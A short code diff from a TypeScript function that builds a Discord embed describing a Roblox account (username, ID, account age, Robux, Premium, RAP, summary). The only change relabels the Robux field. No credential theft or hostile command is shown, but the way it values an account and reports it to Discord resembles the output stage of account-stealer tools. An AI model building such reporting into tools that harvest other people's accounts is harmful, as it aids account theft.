@@ -678,7 +678,7 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.user} Username (13+)`, value: `${roblox.name} (${roblox.displayName})`, inline: true },
       { name: `${EMOJI.id} User ID`, value: String(roblox.id), inline: true },
       { name: `${EMOJI.age_acct} Account Age`, value: ageStr, inline: true },
-      { name: `${EMOJI.robux} Robux (Pending)`, value: robuxStr, inline: true },
+      { name: `${EMOJI.robux} Robux`, value: robuxStr, inline: true },
       { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
       { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
